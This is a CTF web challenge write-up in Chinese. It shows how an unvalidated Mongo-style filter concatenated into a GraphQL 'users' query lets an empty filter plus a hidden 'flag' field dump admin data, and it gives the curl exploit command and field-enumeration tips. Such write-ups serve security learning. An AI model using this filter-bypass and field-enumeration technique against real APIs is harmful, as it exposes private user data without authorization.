## 题解

### 入口与指纹

`/` 是 `View The Admins` 用户列表，前端 `/static/js/scripts.js` 用 GraphQL
`POST /api/users` 查询，把 `search`/`options` 直接拼进查询字符串：

```js
const query = `query { users(search: "${search}", options: "${options}") { username email } }`;
fetchUsers('{"email": {"$regex": ".*@heytheregotrythis.com"}, "is_admin": false}', '{"skip": 0, "limit": 10}');
```

### 关键观察

- `search` 是一个 Mongo 风格的过滤条件（JSON 字符串），被原样拼进 GraphQL。
- 前端只查 `is_admin: false` 的用户，但服务端不做校验；直接传 `{}` 就能拿到全部用户。
- `UserType` 上有个隐藏字段 `flag`，普通列表不返回，但可以显式查询。

### 利用链

```bash
T=$(head -1 .target)
curl -sS -X POST -H 'Content-Type: application/json' \
  -d '{"query":"query { users(search: \"{}\", options: \"{}\") { username flag } }"}' \
  "http://$T/api/users" | grep -o 'flag{[^}]*}'
```

返回里 `admin2` 的 `flag` 字段就是答案。

### flag 位置

GraphQL `users` 查询的 `flag` 字段（`admin2` 用户）。

## 复盘

- 前端 JS 里写死的查询条件就是「服务端期望的最严格条件」，把它改空即可越权。
- GraphQL 的隐藏字段可以用「猜字段名 + 看报错」枚举：未知字段会明确报
  `Cannot query field "x" on type "UserType"`。
